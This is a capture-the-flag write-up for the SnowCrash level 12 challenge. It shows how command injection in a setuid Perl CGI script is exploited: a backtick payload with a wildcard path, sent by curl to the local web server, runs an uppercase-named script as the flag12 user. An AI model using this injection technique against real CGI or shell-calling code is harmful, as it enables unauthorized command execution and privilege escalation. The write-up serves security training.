# LEVEL 12

## Vulnerability

Privilege escalation via CGI code injection 

## Main concepts encountered

Perl, CGI, regex

## Initial context

In our home directory, we see a perl script with suid/guid bit and extended permissions:

```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

## Solving the challenge

First, let's understand what the script does:

```
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

We see that it binds itself to port 4646 and sets up a Common Gateway Interface expecting parameters x and y.
It then runs the n subroutine, which runs the t subroutine with parameters x and y, and evaluates its output.
In subroutine t, we see it will run a subprocess to change directory to /tmp, execute an egrep there and evaluate its output.
We should be able to exploit this, since the perl script will be run with flag12 as effective user.
We'd like to inject code via the x parameter, to have it be executed alongside the grep command.

To provide the correct input, we should first take into account the transformations applied to the x argument:

- `$xx =~ tr/a-z/A-Z/`: all letters will be uppercased
- `$xx =~ s/\s.*//`: the argument must start with a whitespace characters, followed by characters. Anything from the first non-character will be ignored.

This means that:

- we can't provide a regular command since it will be capitalized:
  ```
  level12@SnowCrash:/tmp\$ ./level12.pl x="getflag"
  Content-type: text/html

  xx = GETFLAG
  ```

- we can't use an environment variable since everything from the $ will be ignored:
  ```
  level12@SnowCrash:/tmp$ ./level12.pl x="\$TEST"
  Content-type: text/html

  xx =
  ```
So one solution could be to store our command in a file, with a name in uppercase to respect the regex check:
```
level12@SnowCrash:/tmp$ echo "whoami > /tmp/user" > WHOAMI
level12@SnowCrash:/tmp$ cat /tmp/WHOAMI
whoami > /tmp/user
```
What we need now is to run the file as we pass the argument, so that the script's command substitution be done on its content.
Let's see what happens if we try to run the script (with backticks, to respect the single-word constraints).

```
level12@SnowCrash:/tmp$ `WHOAMI`
WHOAMI: command not found

level12@SnowCrash:/tmp$ `/tmp/WHOAMI`
level12@SnowCrash:/tmp$ cat user
level12
```

We see that we must use the file's absolute path for this to work, but don't forget that the script will transform this input:

```
level12@SnowCrash:/tmp$ ./level12.pl x="/tmp/WHOAMI"
Content-type: text/html

xx = /TMP/WHOAMI
```

So we need to find a way to avoid using characters for the dirpath:

```
level12@SnowCrash:/tmp$ ./level12.pl x="/*/WHOAMI"
Content-type: text/html

xx = /*/WHOAMI
```

If we provide the output of this file:

```
level12@SnowCrash:/tmp$ ./level12.pl x="`/*/WHOAMI`"
-bash: /tmp/WHOAMI: Permission denied
```

We see we need to allow other users to execute it:

```
level12@SnowCrash:/tmp$ chmod a+x WHOAMI
level12@SnowCrash:/tmp$ ./level12.pl x="`/*/WHOAMI`"
Content-type: text/html

.level12@SnowCrash:/tmp$ cat user
level12
```

According to the conf, the web server running on port 4646 should execute the script as flag12:

```
level12@SnowCrash:/tmp$ cat /etc/apache2/sites-enabled/level12.conf
<VirtualHost *:4646>
	DocumentRoot	/var/www/level12/
	SuexecUserGroup flag12 level12
	<Directory /var/www/level12>
		Options +ExecCGI
		DirectoryIndex level12.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>
```

Let's check this:

```
level12@SnowCrash:/tmp$ curl '127.0.0.1:4646?x="`/*/WHOAMI`"'
..level12@SnowCrash:/tmp$ cat user
flag12
```

So now, let's repeat everything with getflag:

```
level12@SnowCrash:/tmp$ echo "getflag > /tmp/token" > GETFLAG && chmod a+x GETFLAG
level12@SnowCrash:/tmp$ curl '127.0.0.1:4646?x="`/*/GETFLAG`"' && cat token
..Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXX
```
